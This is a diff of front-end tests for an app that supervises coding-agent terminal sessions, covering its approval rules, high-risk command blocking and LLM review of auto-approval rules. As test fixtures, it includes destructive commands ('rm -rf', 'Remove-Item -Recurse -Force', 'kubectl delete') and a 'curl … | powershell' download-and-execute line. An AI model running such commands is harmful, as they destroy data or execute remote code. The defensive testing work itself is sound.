@@ -4,13 +4,13 @@ import '@testing-library/jest-dom/vitest'
 import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
 
-import type { AgentManagerApi, NativeSessionSummary, SessionSummary } from '../../src/shared/manager-api'
+import type { AgentManagerApi, DangerRuleScope, NativeSessionSummary, SessionSummary } from '../../src/shared/manager-api'
 
 const terminalMocks = vi.hoisted(() => ({
   cols: 80, rows: 24, open: vi.fn(), write: vi.fn(), resize: vi.fn(), paste: vi.fn(), dispose: vi.fn(),
   options: { fontSize: 12 },
   modes: { bracketedPasteMode: true }, hasSelection: vi.fn(() => false), getSelection: vi.fn(() => ''),
-  scrollToBottom: vi.fn(), scrollLines: vi.fn(), scrollToLine: vi.fn(),
+  scrollToBottom: vi.fn(), scrollLines: vi.fn(), scrollToLine: vi.fn(), refresh: vi.fn(),
   buffer: { active: { type: 'normal', baseY: 0, viewportY: 0 } },
   attachCustomKeyEventHandler: vi.fn(), attachCustomWheelEventHandler: vi.fn(),
   onData: vi.fn(() => ({ dispose: vi.fn() })), onScroll: vi.fn(() => ({ dispose: vi.fn() })),
@@ -33,7 +33,20 @@ describe('App terminal wall', () => {
     expect(isTerminalProtocolResponse('\x1b[?1;2c')).toBe(true)
     expect(isTerminalProtocolResponse('\x1b]10;rgb:cbcb/d9d9/d7d7\x1b\\')).toBe(true)
     expect(isTerminalProtocolResponse('\x1b]10;rgb:cbcb/d9d9/d7d7\x1b\\\x1b]11;rgb:0b0b/1010/1111\x07')).toBe(true)
+    expect(isTerminalProtocolResponse('\x1b[C')).toBe(false)
     expect(isTerminalProtocolResponse('continue\r')).toBe(false)
+  })
+
+  it('forwards the Codex right-arrow sequence as terminal input', async () => {
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    const onDataCalls = terminalMocks.onData.mock.calls as unknown as Array<[(data: string) => void]>
+    const onData = onDataCalls[0]?.[0]
+    expect(onData).toBeTypeOf('function')
+
+    onData?.('\x1b[C')
+
+    await waitFor(() => expect(api.write).toHaveBeenCalledWith('session-1', '\x1b[C'))
   })
 
   afterEach(cleanup)
@@ -43,6 +56,7 @@ describe('App terminal wall', () => {
     vi.clearAllMocks()
     window.localStorage.clear()
     api = {
+      platform: 'win32',
       listSessions: vi.fn(async () => [session]), startSession: vi.fn(async (request) => ({ ...session, displayName: request.displayName, agentKind: request.agentKind, workspace: request.workspace })), write: vi.fn(), resize: vi.fn(),
       terminalReplay: vi.fn(async () => ({ data: '', sequence: 0 })),
       listAuditEntries: vi.fn(async () => []),
@@ -66,6 +80,49 @@ describe('App terminal wall', () => {
       acceptRecoverySuggestion: vi.fn(), dismissRecoverySuggestion: vi.fn(),
       acceptApprovalSuggestion: vi.fn(), dismissApprovalSuggestion: vi.fn(),
       listApprovalRules: vi.fn(async () => ['git log --oneline']), addApprovalRule: vi.fn(), removeApprovalRule: vi.fn(),
+      listDangerRules: vi.fn(async () => [
+        {
+          id: 'recursive-force-remove', name: '递归或强制删除', description: '递归删除会移除大量文件',
+          pattern: 'rm -r/-f', patternKind: 'regex' as const, origin: 'built-in' as const, enabled: true,
+          scopes: ['safe-rule', 'bulk-approval', 'full-auto'] as DangerRuleScope[],
+        },
+        {
+          id: 'custom-production', name: '生产数据库', description: '命令包含该关键词时拦截',
+          pattern: 'prod-db', patternKind: 'contains' as const, origin: 'custom' as const, enabled: true,
+          scopes: ['safe-rule', 'bulk-approval', 'full-auto'] as DangerRuleScope[],
+        },
+      ]),
+      addDangerRule: vi.fn(async (input) => ({
+        id: 'custom-new', name: input.name, description: '命令包含该关键词时拦截',
+        pattern: input.keyword, patternKind: 'contains' as const, origin: 'custom' as const, enabled: true,
+        scopes: ['safe-rule', 'bulk-approval', 'full-auto'] as DangerRuleScope[],
+      })),
+      setDangerRuleEnabled: vi.fn(),
+      removeDangerRule: vi.fn(),
+      testDangerCommand: vi.fn(async (command) => ({
+        command,
+        matches: [{
+          id: 'recursive-force-remove', name: '递归或强制删除', description: '递归删除会移除大量文件',
+          pattern: 'rm -r/-f', patternKind: 'regex' as const, origin: 'built-in' as const, enabled: true,
+          scopes: ['safe-rule', 'bulk-approval', 'full-auto'] as DangerRuleScope[],
+        }],
+      })),
+      getLlmReviewSettings: vi.fn(async () => ({
+        enabled: false, level: 'high' as const, hasApiKey: false, retryCount: 3,
+        timeoutSeconds: 30,
+        scheduledRuleAuditEnabled: false, scheduledRuleAuditHours: 24,
+        proxyEnabled: false, proxyHost: '127.0.0.1', proxyPort: 7897, hasProxyPassword: false,
+        ruleAuditState: { status: 'idle' as const },
+      })),
+      updateLlmReviewSettings: vi.fn(async (value) => ({
+        enabled: value.enabled, level: value.level, baseUrl: value.baseUrl, hasApiKey: Boolean(value.apiKey),
+        model: value.model, retryCount: value.retryCount, timeoutSeconds: value.timeoutSeconds,
+        scheduledRuleAuditEnabled: value.scheduledRuleAuditEnabled, scheduledRuleAuditHours: value.scheduledRuleAuditHours,
+        proxyEnabled: value.proxyEnabled, proxyHost: value.proxyHost ?? '127.0.0.1', proxyPort: value.proxyPort ?? 7897,
+        proxyUsername: value.proxyUsername, hasProxyPassword: Boolean(value.proxyPassword),
+        ruleAuditState: { status: 'idle' as const },
+      })),
+      reviewApprovalRules: vi.fn(async () => ({ status: 'running' as const, source: 'manual' as const, startedAt: Date.now() })),
       readClipboardText: vi.fn(async () => 'const pasted = true'),
       writeClipboardText: vi.fn(async () => undefined),
       discoverSessions: vi.fn(async () => [{ id: 'codex-1', title: '修复登录流程', updatedAt: 1_786_000_000_000, workspace: 'B:\\chosen\\workspace' }]),
@@ -465,6 +522,44 @@ describe('App terminal wall', () => {
     expect(await screen.findByText('环境已就绪，可以创建 Agent。')).toBeInTheDocument()
   })
 
+  it('keeps installation progress and readiness isolated while switching Agent types', async () => {
+    let codexInstalled = false
+    let completeInstall!: () => void
+    vi.mocked(api.detectAgentEnvironment!).mockImplementation(async (kind, executable) => ({
+      agentKind: kind,
+      executable,
+      packageName: kind === 'claude' ? '@anthropic-ai/claude-code' : '@openai/codex',
+      nodeAvailable: true,
+      npmAvailable: true,
+      nodeVersion: 'v22.0.0',
+      npmVersion: '10.0.0',
+      agentInstalled: kind === 'claude' || codexInstalled,
+      ...(kind === 'claude' || codexInstalled ? { executableVersion: kind === 'claude' ? '2.0.0' : 'codex 1.0.0' } : {}),
+    }))
+    vi.mocked(api.installAgent!).mockImplementationOnce(() => new Promise<void>((resolve) => {
+      completeInstall = () => { codexInstalled = true; resolve() }
+    }))
+
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: /新建 Agent/ }))
+    fireEvent.click(screen.getByRole('button', { name: '选择文件夹' }))
+    await waitFor(() => expect(screen.getByLabelText('工作区')).not.toHaveValue(''))
+    fireEvent.click(await screen.findByRole('button', { name: '一键安装 Agent CLI' }))
+    expect(await screen.findByText('正在等待安装程序输出…')).toBeInTheDocument()
+
+    fireEvent.change(screen.getByLabelText('Agent 类型'), { target: { value: 'claude' } })
+    await waitFor(() => expect(api.detectAgentEnvironment).toHaveBeenCalledWith('claude', 'claude'))
+    expect(screen.queryByText('正在等待安装程序输出…')).not.toBeInTheDocument()
+    expect(screen.getByRole('button', { name: '启动 Agent' })).toBeEnabled()
+
+    fireEvent.change(screen.getByLabelText('Agent 类型'), { target: { value: 'codex' } })
+    expect(await screen.findByText('正在等待安装程序输出…')).toBeInTheDocument()
+
+    await act(async () => { completeInstall() })
+    expect(await screen.findByText('环境已就绪，可以创建 Agent。')).toBeInTheDocument()
+    expect(screen.getByRole('button', { name: '启动 Agent' })).toBeEnabled()
+  })
   it('starts DeepSeek Harness as a managed local Web Agent', async () => {
     render(<App />)
     await screen.findByText('Codex API 重构')
@@ -506,6 +601,27 @@ describe('App terminal wall', () => {
     expect(screen.getByDisplayValue('B:\\tools\\codex.cmd')).toBeInTheDocument()
   })
 
+  it('uses zsh as the default generic Agent shell on macOS', async () => {
+    window.agentManager = { ...api, platform: 'darwin' }
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: /新建 Agent/ }))
+    fireEvent.change(screen.getByLabelText('Agent 类型'), { target: { value: 'generic' } })
+    fireEvent.click(screen.getByText('高级设置'))
+    expect(screen.getByDisplayValue('zsh')).toBeInTheDocument()
+  })
+
+  it('uses the macOS fixed fullscreen layout when an Agent is opened', async () => {
+    window.agentManager = { ...api, platform: 'darwin' }
+    render(<App />)
+
+    const tile = await screen.findByTestId('terminal-tile-session-1')
+    fireEvent.click(tile)
+
+    expect(document.querySelector('.app-shell')).toHaveClass('platform-darwin', 'detail-shell')
+    expect(document.querySelector('.workspace-layout')).toHaveClass('workspace-layout-detail')
+    expect(document.querySelector('.terminal-grid')).toHaveClass('terminal-grid-detail')
+  })
   it('starts one Agent with an independent HTTP proxy while keeping model configuration local', async () => {
     render(<App />)
     await screen.findByText('Codex API 重构')
@@ -663,6 +779,28 @@ describe('App terminal wall', () => {
     terminalMocks.buffer.active.viewportY = 0
   })
 
+  it('repaints after terminal auto-approval without resizing, remounting, or moving scrollback', async () => {
+    terminalMocks.write.mockImplementation((...args: unknown[]) => {
+      const callback = args[1]
+      if (typeof callback === 'function') callback()
+    })
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    const listeners = vi.mocked(api.subscribe).mock.calls.map((call) => call[0])
+    terminalMocks.refresh.mockClear()
+    terminalMocks.resize.mockClear()
+    terminalMocks.scrollToBottom.mockClear()
+
+    act(() => listeners.forEach((listener) => listener({ type: 'terminal-refresh-requested', sessionId: session.sessionId })))
+    act(() => listeners.forEach((listener) => listener({ type: 'output', sessionId: session.sessionId, sequence: 1, data: 'approved output' })))
+
+    await waitFor(() => expect(terminalMocks.refresh).toHaveBeenCalledWith(0, terminalMocks.rows - 1))
+    expect(terminalMocks.resize).not.toHaveBeenCalled()
+    expect(terminalMocks.scrollToBottom).not.toHaveBeenCalled()
+    expect(Terminal).toHaveBeenCalledTimes(1)
+    expect(terminalMocks.open).toHaveBeenCalledTimes(1)
+  })
+
   it('reloads the newest approval when another state event arrives during a session read', async () => {
     const listeners: Array<Parameters<AgentManagerApi['subscribe']>[0]> = []
     let resolveIntermediate: ((sessions: SessionSummary[]) => void) | undefined
@@ -685,6 +823,56 @@ describe('App terminal wall', () => {
     const tile = await screen.findByTestId('terminal-tile-session-1')
     await waitFor(() => expect(within(tile).getByText('待授权')).toBeInTheDocument())
     expect(api.listSessions).toHaveBeenCalledTimes(3)
+  })
+
+  it('applies approval snapshots without reloading stale session state', async () => {
+    const listeners: Array<Parameters<AgentManagerApi['subscribe']>[0]> = []
+    vi.mocked(api.subscribe).mockImplementation((listener) => {
+      listeners.push(listener)
+      return () => undefined
+    })
+
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    const initialReads = vi.mocked(api.listSessions).mock.calls.length
+    const approval = {
+      requestId: 'terminal:approval-1',
+      sessionId: session.sessionId,
+      displayName: session.displayName,
+      agentKind: session.agentKind,
+      workspace: session.workspace,
+      source: 'terminal' as const,
+      risk: 'write' as const,
+      command: 'Set-Content result.txt done',
+      reason: '需要写入文件',
+      createdAt: Date.now(),
+      canBulkApprove: true,
+    }
+
+    act(() => listeners.forEach((listener) => listener({
+      type: 'sessions-changed',
+      sessionId: session.sessionId,
+      session: {
+        ...session,
+        status: 'needs_approval',
+        pendingApprovalCommand: approval.command,
+        pendingApprovalCount: 1,
+      },
+      approvals: [approval],
+    })))
+
+    const tile = await screen.findByTestId('terminal-tile-session-1')
+    await waitFor(() => expect(within(tile).getByText('待授权')).toBeInTheDocument())
+    expect(api.listSessions).toHaveBeenCalledTimes(initialReads)
+
+    act(() => listeners.forEach((listener) => listener({
+      type: 'sessions-changed',
+      sessionId: session.sessionId,
+      session,
+      approvals: [],
+    })))
+    await waitFor(() => expect(within(tile).queryByText('待授权')).not.toBeInTheDocument())
+    expect(api.listSessions).toHaveBeenCalledTimes(initialReads)
   })
 
   it('accepts or dismisses an approval rule suggestion on the Agent tile', async () => {
@@ -727,6 +915,31 @@ describe('App terminal wall', () => {
     expect(screen.getByRole('heading', { name: '自动批准规则' })).toBeInTheDocument()
     fireEvent.doubleClick(backdrop!)
     expect(screen.queryByRole('heading', { name: '自动批准规则' })).not.toBeInTheDocument()
+  })
+
+  it('shows, maintains, and tests high-risk command rules', async () => {
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: '批准规则' }))
+    fireEvent.click(await screen.findByRole('button', { name: /高危命令/ }))
+
+    expect(await screen.findByText('递归或强制删除')).toBeInTheDocument()
+    expect(screen.getByText('生产数据库')).toBeInTheDocument()
+    fireEvent.change(screen.getByLabelText('高危规则名称'), { target: { value: '生产部署' } })
+    fireEvent.change(screen.getByLabelText('高危命令关键词'), { target: { value: 'kubectl delete' } })
+    fireEvent.click(screen.getByRole('button', { name: '添加拦截' }))
+    await waitFor(() => expect(api.addDangerRule).toHaveBeenCalledWith({ name: '生产部署', keyword: 'kubectl delete' }))
+
+    const customRow = screen.getByText('生产数据库').closest('article')
+    fireEvent.click(within(customRow!).getByRole('button', { name: '停用' }))
+    await waitFor(() => expect(api.setDangerRuleEnabled).toHaveBeenCalledWith('custom-production', false))
+    fireEvent.click(within(customRow!).getByRole('button', { name: '删除' }))
+    await waitFor(() => expect(api.removeDangerRule).toHaveBeenCalledWith('custom-production'))
+
+    fireEvent.change(screen.getByLabelText('测试一条命令会命中哪些规则'), { target: { value: 'rm -rf fixtures' } })
+    fireEvent.click(screen.getByRole('button', { name: '检测' }))
+    expect(await screen.findByText('命中 1 条高危规则')).toBeInTheDocument()
+    expect(api.testDangerCommand).toHaveBeenCalledWith('rm -rf fixtures')
   })
 
   it('chooses the workspace through the system directory picker', async () => {
@@ -874,6 +1087,88 @@ describe('App terminal wall', () => {
     expect(screen.getAllByText('Codex API 重构 已启动')).toHaveLength(2)
     fireEvent.click(screen.getByRole('button', { name: /Agent 总览/ }))
     expect(await screen.findByRole('heading', { name: 'Agent 总览' })).toBeInTheDocument()
+  })
+
+  it('restores a background LLM rule audit after the settings drawer is reopened', async () => {
+    vi.mocked(api.getLlmReviewSettings).mockResolvedValue({
+      enabled: true, level: 'high', hasApiKey: true, retryCount: 3, timeoutSeconds: 45,
+      scheduledRuleAuditEnabled: false, scheduledRuleAuditHours: 24,
+      proxyEnabled: false, proxyHost: '127.0.0.1', proxyPort: 7897, hasProxyPassword: false,
+      ruleAuditState: { status: 'running', source: 'manual', startedAt: Date.now() },
+    })
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: /LLM 审查/ }))
+    expect(await screen.findByText('审查正在后台进行')).toBeInTheDocument()
+    expect(screen.getByDisplayValue('45')).toHaveValue(45)
+
+    fireEvent.click(screen.getByRole('button', { name: '取消' }))
+    expect(screen.queryByText('审查正在后台进行')).not.toBeInTheDocument()
+
+    vi.mocked(api.getLlmReviewSettings).mockResolvedValue({
+      enabled: true, level: 'high', hasApiKey: true, retryCount: 3, timeoutSeconds: 45,
+      scheduledRuleAuditEnabled: false, scheduledRuleAuditHours: 24,
+      proxyEnabled: false, proxyHost: '127.0.0.1', proxyPort: 7897, hasProxyPassword: false,
+      ruleAuditState: { status: 'completed', source: 'manual', completedAt: Date.now() },
+      lastRuleAudit: { reviewedAt: Date.now(), model: 'security-model', ruleCount: 1, summary: '后台审查已经完成', findings: [] },
+    })
+    fireEvent.click(screen.getByRole('button', { name: /LLM 审查/ }))
+    expect(await screen.findByText('后台审查已经完成')).toBeInTheDocument()
+  })
+
+  it('shows rule audit findings in a separate Chinese detail view and removes an exact dangerous rule', async () => {
+    const dangerousRule = 'Remove-Item -Recurse -Force .\\fixtures\\legacy'
+    vi.mocked(api.listApprovalRules).mockResolvedValue([dangerousRule])
+    vi.mocked(api.getLlmReviewSettings).mockResolvedValue({
+      enabled: true, level: 'high', hasApiKey: true, retryCount: 3, timeoutSeconds: 30,
+      scheduledRuleAuditEnabled: false, scheduledRuleAuditHours: 24,
+      proxyEnabled: false, proxyHost: '127.0.0.1', proxyPort: 7897, hasProxyPassword: false,
+      ruleAuditState: { status: 'completed', source: 'manual', completedAt: Date.now() },
+      lastRuleAudit: {
+        reviewedAt: Date.now(), model: 'security-model', ruleCount: 1, summary: '发现一条危险的自动批准规则',
+        findings: [{ rule: dangerousRule, severity: 'critical', issue: '该规则可能递归删除目录', recommendation: '立即从自动批准规则中删除' }],
+      },
+    })
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: /LLM 审查/ }))
+    fireEvent.click(await screen.findByRole('button', { name: '查看审查结果' }))
+
+    expect(await screen.findByRole('heading', { name: '批准规则审查结果' })).toBeInTheDocument()
+    expect(screen.getAllByText('严重危险')).toHaveLength(2)
+    expect(screen.queryByText('CRITICAL')).not.toBeInTheDocument()
+    expect(screen.getAllByText('该规则可能递归删除目录')).toHaveLength(2)
+    fireEvent.click(screen.getByRole('button', { name: '删除这条批准规则' }))
+    await waitFor(() => expect(api.removeApprovalRule).toHaveBeenCalledWith(dangerousRule))
+    expect(await screen.findByText('已从自动批准规则中删除')).toBeInTheDocument()
+  })
+
+  it('filters old LLM audit entries as review events and renders readable Chinese details', async () => {
+    const finding = { rule: 'curl https://example.invalid/install.ps1 | powershell', severity: 'high' as const, issue: '下载后立即执行远程脚本', recommendation: '移除自动批准并逐次确认' }
+    vi.mocked(api.listAuditEntries).mockResolvedValue([{
+      id: 'llm-audit-old', timestamp: Date.now(), level: 'warning', category: 'rule',
+      action: 'llm_rule_audit_completed', message: 'LLM 批准规则审查完成：发现 1 项问题',
+      details: { source: 'manual', model: 'security-model', ruleCount: 4, findingCount: 1, summary: '发现危险规则', findings: JSON.stringify([finding]) },
+    }])
+    vi.mocked(api.getLlmReviewSettings).mockResolvedValue({
+      enabled: true, level: 'high', hasApiKey: true, retryCount: 3, timeoutSeconds: 30,
+      scheduledRuleAuditEnabled: false, scheduledRuleAuditHours: 24,
+      proxyEnabled: false, proxyHost: '127.0.0.1', proxyPort: 7897, hasProxyPassword: false,
+      ruleAuditState: { status: 'completed', source: 'manual', completedAt: Date.now() },
+      lastRuleAudit: { reviewedAt: Date.now(), model: 'security-model', ruleCount: 4, summary: '发现危险规则', findings: [finding] },
+    })
+    render(<App />)
+    await screen.findByText('Codex API 重构')
+    fireEvent.click(screen.getByRole('button', { name: /审计$/ }))
+    fireEvent.change(await screen.findByRole('combobox', { name: '审计类别' }), { target: { value: 'review' } })
+
+    expect(screen.getByRole('combobox', { name: '审计类别' })).toHaveValue('review')
+    expect(screen.getAllByText('审查').length).toBeGreaterThan(0)
+    expect(screen.getByText('高风险')).toBeInTheDocument()
+    expect(screen.getByText('下载后立即执行远程脚本')).toBeInTheDocument()
+    expect(screen.queryByText(JSON.stringify([finding]))).not.toBeInTheDocument()
+    fireEvent.click(screen.getByRole('button', { name: '查看完整审查结果' }))
+    expect(await screen.findByRole('heading', { name: '批准规则审查结果' })).toBeInTheDocument()
   })
 
   it('renders large audit histories in pages of fifty rows', async () => {
